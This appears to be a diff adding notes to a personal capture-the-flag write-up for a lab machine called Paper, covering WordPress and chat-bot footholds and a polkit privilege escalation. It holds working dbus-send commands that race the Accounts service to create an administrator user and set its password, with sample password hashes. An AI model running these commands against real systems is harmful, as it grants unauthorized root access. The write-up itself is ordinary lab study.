@@ -68,10 +68,32 @@ dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-re
 * Polkit exploitation that the exact operating system that we have is vulnerable to. It has the exact specifications that allow this exploit to succeed
 <br/><br/>
 
+time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:boris string:"Boris Ivanovich Grishenko" int32:1
 
+
+
+dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:boris string:"Boris Ivanovich Grishenko" int32:1 & sleep 0.031s ; kill $!
+
+
+dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1005 org.freedesktop.Accounts.User.SetPassword string:'$5$7Bmgdl.nOd4aCvZT$aJYFtjdy7Q1k4nj4BYOmkLJwy9LRyHKANHlGwDtXgz2' string:GoldenEye & sleep 0.037s ; kill $!
+
+dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1005 org.freedesktop.Accounts.User.SetPassword string:'$5$Fv2PqfurMmI879J7$ALSJ.w4KTP.mHrHxM2FYV3ueSipCf/QSfQUlATmWuuB' string:GoldenEye & sleep 0.004s ; kill $!
+
+
+dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1002 org.freedesktop.Accounts.User.SetPassword string:'$5$DZLSLHAIcAsGYarl$J31FNwHG4ZOf7hu0.LmuX13.y1xl9xz8HnySsPaMaK7' string:GoldenEye & sleep 0.035s ; kill $!
+
+$5$1dKf1P7dhcB2i1QA$PQJrOE013sKIrqLOaWbdPTWpFFW0qhJV2f4ckr0WM28
 
 ## <span style="color:#CC6699">How Did I Solve the Machine 😎🥳 
 
+1. Found a header that had `X-Backend-Server:office.paper` and when I tried to put `office.paper` as the domain for http it opened up a whole new website which meant that there are "Virtual Hosts".  
+2. The website works on Wordpress.
+3. Found an exploit after I bruteforced for files and directories for the specific version of WordPress we had.
+4. If I put the parameter `?static=1` to any page it could open up secrets ( I think it shows me a test page or sth like that Imma research this).
+5. When using the exploit I found a url for a subdomain that uses "rocketchat" and you can't register unless we had a specific url.
+6. After registering I found a bot that I can straight up send commands to.
+7. After some research I found that if I put the word `run` before any comand I can run anything I want. So I put a reverse shell and easily got foothold in the system.  
+8. I kept researching the system for something until I found that it was vulnerable for a Polkit exploit. The exact OS version and whatever the exploit needs I have. This got me root.
 
 <br/><br/>
 
@@ -79,6 +101,7 @@ dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-re
 
 ## <span style="color:#CC6699">Where I Got Stuck?😡😧  
 
+* I got stuck researching the system for a way to privesc until I updated linpeas and found a polkit vulnerability in the operating system.
 
 <br/><br/>
 
@@ -86,16 +109,9 @@ dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-re
 
 ## <span style="color:#CC6699">What Did I learn from this Machine?👀  
 
+* Bots can sometimes be a vulnerability.
 
 <br/><br/>
-
-
-
-## <span style="color:#CC6699">Writeups ✍🏽📓   
-
-
-<br/><br/>
-
 
 
 
